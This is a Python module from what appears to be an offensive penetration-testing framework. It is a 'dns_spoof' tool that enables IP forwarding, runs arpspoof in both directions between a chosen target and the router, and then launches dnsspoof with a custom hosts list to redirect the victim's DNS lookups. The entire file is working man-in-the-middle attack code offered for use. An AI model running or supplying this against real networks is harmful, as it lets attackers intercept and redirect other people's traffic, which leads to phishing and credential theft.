#        Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)
from core import colors
from collections import OrderedDict
import os
import time
from core import getpath

conf = {
	"name": "dns_spoof",
	"version": "1.0",
	"shortdesc": "dns spoof",
	"author": "4shadoww",
	"github": "4shadoww",
	"email": "4shadoww0@gmail.com",
	"initdate": "29.4.2016",
	"lastmod": "27.12.2016",
	"apisupport": False,
	"needroot": 1,
	"dependencies": ["xterm", "dsniff"]
}


# List of the variables
variables = OrderedDict((
	('interface', ['eth0', 'target interface']),
	('target', ['192.168.1.2', 'target address']),
	('router', ['192.168.1.1', 'router address']),
))

# Additional help notes
help_notes = colors.red+"this module will not work without dsniff!"+colors.end

# Additional notes to options
option_notes = colors.red+'remember to edit hostslist:\n'+getpath.conf()+"hosts"+colors.end

customcommands = {
	'stop': 'end dnsspoof'
}


#simple changelog
changelog = "Version 1.0:\nrelease"

def run():
	hostslist = getpath.conf()+"hosts"
	print(colors.blue+"ipv4 forwarding..."+colors.end)
	os.system('echo "1" >> /proc/sys/net/ipv4/ip_forward')
	print(colors.blue+"starting arp spoof..."+colors.end)
	xterm1 = "xterm -e arpspoof -i "+ variables['interface'][0]+ " -t "+ variables['target'][0]+ " "+ variables['router'][0] + " &"
	xterm2 = "xterm -e arpspoof -i "+ variables['interface'][0]+ " -t "+ variables['router'][0]+ " "+ variables['target'][0] + " &"
	os.system(xterm1)
	os.system(xterm2)
	print(colors.blue+"waiting for arp spoof..."+colors.end)
	time.sleep(5)
	print(colors.blue+"starting dns spoof..."+colors.end)
	xterm3 = "xterm -e dnsspoof -i "+ variables['interface'][0]+ " -f "+ hostslist + " host " + variables['target'][0]+ " &"
	os.system(xterm3)
	print(colors.blue+'use "stop" command to end'+colors.end)

def stop(args):
	os.system("killall arpspoof")
	os.system("killall dnsspoof")